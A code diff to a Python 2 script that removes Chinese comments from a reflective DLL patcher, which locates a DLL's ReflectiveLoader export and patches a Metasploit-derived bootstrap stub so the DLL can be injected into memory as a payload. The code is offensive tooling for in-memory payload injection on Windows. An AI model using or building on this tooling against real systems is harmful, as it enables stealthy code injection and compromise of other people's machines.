@@ -19,24 +19,24 @@ class bcolors:
     GREEN = '\033[32m'
     ENDC = '\033[0m'
 
-#获取文件偏移地址
+
 def get_file_offset(pe):
   rva =''
-  #找到PE导出函数，也就是dll文件的EXPLOIT地址
+
   if hasattr(pe, 'DIRECTORY_ENTRY_EXPORT'):
-    #找loader地址
+
     for export in pe.DIRECTORY_ENTRY_EXPORT.symbols:
       if "ReflectiveLoader" in export.name:
-        #指向导出地址赋值
+
         rva = export.address
         break;
 
   if not rva:
     sys.exit(1)
     
-  #得到虚函数地址长度
+
   offset_va = rva - pe.get_section_by_rva(rva).VirtualAddress
-  #得到基地址长度
+
   offset_file = offset_va + pe.get_section_by_rva(rva).PointerToRawData
 
   # Correct 7 bytes
@@ -45,7 +45,7 @@ def get_file_offset(pe):
   # Return little endian version
   return struct.pack("<I", offset_file).encode('hex')
 
-#对stub头进行修复
+
 #https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/payload/windows/reflectivedllinject.rb
 def patch_stub(offset_file, exit_addr):
   stub = ("\x4D"                                    # dec ebp             ; M
@@ -71,7 +71,7 @@ def patch_stub(offset_file, exit_addr):
 
 #Return Path Dll
 def reflective_patcher(dll):
-  #退出DLLMain函数地址,默认为退出当前线索迁移
+
   exit_method = {'thread': '\xE0\x1D\x2A\x0A', 'seh': '\xFE\x0E\x32\xEA', 'process':'\xF0\xB5\xA2\x56'}
   exit_addr = exit_method["process"]
 
@@ -82,18 +82,18 @@ def reflective_patcher(dll):
   '''
 
   try:
-    #dll为dll的绝对路径
+
     pe =  pefile.PE(dll)
   except IOError as e:
     print str(e)
     sys.exit(1)
     
-  #获取PE结构中导出函数地址偏移
+
   offset_file = get_file_offset(pe)
-  #重定位地址，等待加载内存
+
   stub = patch_stub(offset_file,exit_addr)
 
-  #读取dll文件，此dll文件为外部加载的dll文件
+
   src = file(dll,'rb')
   payload = src.read()
 
